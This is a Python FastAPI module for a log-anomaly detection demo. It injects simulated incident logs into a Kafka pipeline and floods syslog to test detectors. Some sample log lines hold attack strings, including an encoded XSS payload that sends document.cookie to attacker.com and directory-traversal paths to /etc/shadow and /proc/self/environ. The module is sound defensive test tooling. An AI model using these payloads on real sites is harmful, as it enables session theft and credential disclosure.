from fastapi import APIRouter
from pydantic import BaseModel
from typing import Optional
import subprocess
import threading
import logging
import json
import time
import random
import socket
from kafka import KafkaProducer

router = APIRouter()
logger = logging.getLogger("logguard.demo")

# All attack scenarios with realistic log text and root cause explanations
ATTACK_SCENARIOS = [
    {
        "category": "OOM Kill",
        "log_text": "[KERNEL] Out of memory: Killed process 3124 (mysqld) total-vm:4124928kB, anon-rss:3213456kB, file-rss:0kB",
        "log_problem": "Heavy memory usage led to an OOM kill. Database randomly terminated, risking data corruption."
    },
    {
        "category": "Brute Force",
        "log_text": "[NGINX] [crit] 18452#0: *84112 open() \"/var/www/html/wp-login.php\" failed (13: Permission denied)",
        "log_problem": "Possible Brute-Force or Directory Traversal attack scanning for vulnerabilities on edge nodes."
    },
    {
        "category": "Connection Exhaustion",
        "log_text": "[POSTGRES] FATAL: remaining connection slots are reserved for non-replication superuser connections",
        "log_problem": "Database connection pool completely exhausted. Possible DDoS attack or catastrophic connection leak."
    },
    {
        "category": "SSH Brute Force",
        "log_text": "[SSHD] Invalid user admin from 104.24.12.112 port 42111 ssh2",
        "log_problem": "Unauthorized access attempt via SSH brute force detected from external malicious IP."
    },
    {
        "category": "SQL Injection",
        "log_text": "[MODSECURITY] Access denied with code 403. Pattern match \"(?i)(union|select|insert|delete)\" at ARGS.",
        "log_problem": "SQL Injection payload detected and blocked by WAF. Immediate payload stream review required."
    },
    {
        "category": "CPU Overheat",
        "log_text": "[SYSTEMD] kernel: CPU temperature above threshold, cpu clock throttled (total events = 142)",
        "log_problem": "System Overload. CPU overheating caused aggressive thermal throttling, destroying API throughput."
    },
    {
        "category": "Port Conflict",
        "log_text": "[DOCKER] Error response from daemon: bind: address already in use",
        "log_problem": "Port conflict during microservice deployment. Critical application container failed to bind to its assigned network interface."
    },
    {
        "category": "Memory Overcommit",
        "log_text": "[REDIS] WARNING: Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition.",
        "log_problem": "Redis memory allocation failing under load. Key-value store risks immediate eviction sweeps."
    },
    {
        "category": "Kafka Desync",
        "log_text": "[KAFKA] [Broker-0] WARN [ReplicaManager broker=0] Leader 0 failed to record follower 1's fetch request.",
        "log_problem": "Streaming cluster partition desync. Kafka brokers are dropping replication packets due to heavy IO bottlenecks."
    },
    {
        "category": "Disk Saturation",
        "log_text": "[ELASTICSEARCH] [WARN][o.e.c.r.a.DiskThresholdMonitor] [node-1] high disk watermark [90%] exceeded on [fs1]... replicas will not be assigned.",
        "log_problem": "Disk saturation imminent. Elasticsearch cluster has halted data assignment to preserve system stability."
    },
    {
        "category": "Cluster Exhaust",
        "log_text": "[FLINK] org.apache.flink.runtime.jobmanager.scheduler.NoResourceAvailableException: Not enough free slots available to run the job.",
        "log_problem": "Cluster exhaust. Data-processing pipelines are failing to allocate execution slots due to extreme computational load."
    },
    {
        "category": "Rate Limiting",
        "log_text": "[AWS-S3] botocore.exceptions.ClientError: An error occurred (SlowDown) when calling the PutObject operation: Please reduce your request rate.",
        "log_problem": "Object storage rate-limiting engaged. Upstream cloud provider is blocking burst transfers, stalling pipeline backups."
    },
    {
        "category": "Packet Flood",
        "log_text": "[IPTABLES] Drop DROP_INVALID: IN=eth0 OUT= MAC=00:1c:42:... SRC=192.0.2.14 DST=10.0.0.12 LEN=40 TOS=0x00 PROTO=TCP SPT=443 DPT=41235 WINDOW=0 FLAGS=RST",
        "log_problem": "Malformed packet flood flagged at firewall boundary. High probability of an inbound TCP SYN/RST teardrop attack."
    },
    {
        "category": "DB Corruption",
        "log_text": "[MONGODB] - [WT] ERROR: read page size: 4096, calculated page size: 8192",
        "log_problem": "WiredTiger storage engine detected page corruption. Critical cache failure potentially destroying NoSQL dataset integrity."
    },
    {
        "category": "Heap Exhaustion",
        "log_text": "[NODEJS] FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory",
        "log_problem": "V8 Engine heap exhaustion. Node.js backend service crashed recursively under heavy asynchronous load."
    },
    {
        "category": "Socket Instability",
        "log_text": "[RABBITMQ] - WARNING: Connection dropped from 10.0.2.5:60021 - read error: Connection reset by peer",
        "log_problem": "Message broker socket instability. Persistent disconnections destroying queue delivery guarantees."
    },
    {
        "category": "502 Gateway",
        "log_text": "[TRAEFIK] [ERROR] 502 Bad Gateway: dial tcp 10.0.4.15:8080: connect: connection refused",
        "log_problem": "Reverse proxy upstream routing failure. Target application nodes are dead or rejecting traffic routing."
    },
    {
        "category": "Shadow File",
        "log_text": "[BASH] root: Authentication failure for ALL users. /etc/shadow signature mismatch.",
        "log_problem": "Catastrophic credential corruption or unauthorized root-level shadow file modification detected."
    },
    {
        "category": "DDoS Flood",
        "log_text": "[NGINX] 192.168.14.201 - - \"GET /index.html HTTP/1.1\" 200 612 - rate: 14832 req/s | 503 Service Temporarily Unavailable (12 upstream servers exhausted)",
        "log_problem": "DDoS HTTP flood detected. Massive request volume from distributed source IPs overwhelmed all upstream application servers, causing cascading 503 failures."
    },
    {
        "category": "DDoS Botnet",
        "log_text": "[HAPROXY] backend web_servers has no server available! 0/12 active, 12/12 down. Connection rate: 48201/s from 2841 unique source IPs.",
        "log_problem": "DDoS volumetric attack in progress. All backend servers collapsed under extreme connection pressure from a botnet of ~2800 nodes."
    },
    {
        "category": "XSS Cookie Steal",
        "log_text": "[NGINX] 45.33.12.87 - - \"GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\" 200 4891",
        "log_problem": "Cross-Site Scripting (XSS) attack detected. Attacker injected encoded JavaScript payload via search parameter to exfiltrate session cookies to external domain."
    },
    {
        "category": "XSS Stored",
        "log_text": "[WAF] [ALERT] Rule 941100: XSS Attack Detected via libinjection. Inbound payload at ARGS:comment",
        "log_problem": "Stored XSS injection attempt intercepted by WAF. Attacker tried to embed persistent JavaScript via image error handler in user comment field."
    },
    {
        "category": "Dir Traversal",
        "log_text": "[NGINX] 103.45.67.12 - - \"GET /../../../../etc/passwd HTTP/1.1\" 400 | \"GET /..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403",
        "log_problem": "Directory Traversal attack detected. Attacker attempted to escape web root using path manipulation to access system credential files (/etc/passwd, /etc/shadow)."
    },
    {
        "category": "Dir Traversal Env",
        "log_text": "[APACHE] [error] [client 91.214.33.18] AH01630: client denied by server configuration: /var/www/html/../../../proc/self/environ",
        "log_problem": "Server-side directory traversal blocked. Attacker targeted /proc/self/environ to extract environment variables containing secrets and API keys."
    },
    {
        "category": "Port Scan",
        "log_text": "[IPTABLES] SYN_SCAN: IN=eth0 SRC=185.220.101.34 DST=10.0.0.12 | Ports hit: 22,80,443,3306,5432,6379,8080,8443,9200,27017 in 1.2s",
        "log_problem": "Active port scanning reconnaissance detected from known Tor exit node. Attacker systematically probing all common service ports to map attack surface."
    },
    {
        "category": "Port Scan IDS",
        "log_text": "[SURICATA] [1:2010935:3] ET SCAN Rapid Multi-Port Scan Detected (SRC: 45.155.205.99) - 847 unique ports in 12 seconds.",
        "log_problem": "High-speed automated port scan detected by IDS. Pre-attack reconnaissance phase — attacker fingerprinting running services for targeted exploitation."
    },
    {
        "category": "Data Exfil API",
        "log_text": "[NGINX] 10.0.2.15 - admin \"POST /api/v1/export/users HTTP/1.1\" 200 48234891 bytes (46MB) | User-Agent: curl/7.81.0",
        "log_problem": "Massive data exfiltration detected. Admin account exported 46MB of user data through API endpoint — possible insider threat or compromised credentials."
    },
    {
        "category": "Data Exfil TLS",
        "log_text": "[FIREWALL] OUTBOUND_ANOMALY: 10.0.0.5 -> 194.36.189.22:443 | 2.1GB transferred in 180s via TLS tunnel | geo: Russia",
        "log_problem": "Suspicious large-volume outbound data transfer to previously unseen foreign IP address. Likely data exfiltration through encrypted tunnel to evade DLP."
    },
    {
        "category": "Bot Stuffing",
        "log_text": "[NGINX] 45.134.26.77 - - \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 | User-Agent: python-requests/2.28.1 | Rate: 420 req/min",
        "log_problem": "Automated bot activity detected. Python script performing credential stuffing attack against WordPress admin panel at high request frequency."
    },
    {
        "category": "Malware Emotet",
        "log_text": "[SYSLOG] clamd[2841]: /tmp/upload_a8f3e2.bin: Win.Trojan.Emotet-9891424-0 FOUND | quarantined",
        "log_problem": "Malware detected in uploaded file. Emotet trojan identified by ClamAV in email attachment — active malspam campaign targeting internal users."
    },
    {
        "category": "Anomalous Login",
        "log_text": "[AUTH] LOGIN_SUCCESS user=db_admin src_ip=41.215.176.22 geo=Nigeria time=03:42:17 UTC | Normal hours: 08:00-18:00 EST | Normal geo: US",
        "log_problem": "Anomalous login behavior detected. Database admin account accessed from unusual geographic location (Nigeria) during off-hours (3:42 AM). Possible credential compromise."
    },
    {
        "category": "Anomalous Download",
        "log_text": "[AUDIT] user=svc_backup action=DOWNLOAD files=1847 size=12.4GB path=/data/customers/** | Historical avg: 23 files/day, 45MB/day",
        "log_problem": "Anomalous data access pattern. Service account downloaded 500x more data than historical baseline — potential insider threat or compromised service account escalation."
    },
]


class DemoRequest(BaseModel):
    lines: int = 150
    scenario: Optional[str] = None           # specific category, or None for random
    count: int = 5                           # how many different attack events to inject


def inject_attacks(count: int, scenario: Optional[str] = None, lines: int = 150):
    """Inject attack anomalies directly into Kafka with proper log_text and log_problem."""
    try:
        producer = KafkaProducer(
            bootstrap_servers='localhost:9092',
            value_serializer=lambda v: json.dumps(v).encode('utf-8')
        )

        wsl_host = socket.gethostname()
        
        # Also flood syslog to trigger the volume-based detector
        try:
            subprocess.run(
                f"awk 'BEGIN {{ for(i=1; i<={lines}; i++) print \"ERROR: Critical system failure \" i }}' | logger",
                shell=True, executable='/bin/bash'
            )
        except Exception:
            pass

        # Pick scenarios
        if scenario:
            choices = [s for s in ATTACK_SCENARIOS if s["category"].lower() == scenario.lower()]
            if not choices:
                choices = random.sample(ATTACK_SCENARIOS, min(count, len(ATTACK_SCENARIOS)))
        else:
            choices = random.sample(ATTACK_SCENARIOS, min(count, len(ATTACK_SCENARIOS)))

        injected = []
        for attack in choices:
            event = {
                "host": wsl_host,
                "tenant_id": "fda5918c-41a1-4638-9eb2-7e303b98a46c",
                "log_volume": random.randint(500, 2000),
                "error_rate": random.uniform(0.5, 0.99),
                "warn_rate": random.uniform(0.05, 0.15),
                "unique_template_count": random.randint(3, 8),
                "template_entropy": random.uniform(3.0, 5.0),
                "avg_response_time_ms": random.uniform(500.0, 1000.0),
                "p95_response_time_ms": random.uniform(1000.0, 3000.0),
                "template_vector": [random.uniform(0, 0.1) for _ in range(100)],
                "window_start": int(time.time()) - 3,
                "window_end": int(time.time()),
                "log_text": attack["log_text"],
                "log_problem": attack["log_problem"]
            }
            # Spike key vector dimensions for ML detection
            event["template_vector"][14] = random.uniform(5.0, 20.0)
            event["template_vector"][42] = random.uniform(10.0, 50.0)

            producer.send("processed-features", event)
            injected.append(attack["category"])
            time.sleep(0.3)  # slight delay between events

        producer.flush()
        producer.close()
        logger.info(f"Injected {len(injected)} attack scenarios: {injected}")

    except Exception as e:
        logger.error(f"Failed to inject attacks: {e}")


@router.post("/trigger")
async def trigger_anomaly(req: DemoRequest):
    """Inject realistic attack anomalies directly into the ML pipeline."""
    t = threading.Thread(target=inject_attacks, args=(req.count, req.scenario, req.lines))
    t.start()
    return {
        "status": "ok",
        "message": f"Injecting {req.count} attack scenarios into the ML pipeline.",
        "scenarios_available": len(ATTACK_SCENARIOS)
    }


@router.get("/scenarios")
async def list_scenarios():
    """Returns all available attack scenarios for the frontend."""
    categories = list(set(s["category"] for s in ATTACK_SCENARIOS))
    return {
        "total": len(ATTACK_SCENARIOS),
        "categories": sorted(categories),
        "scenarios": [{"category": s["category"], "log_problem": s["log_problem"]} for s in ATTACK_SCENARIOS]
    }
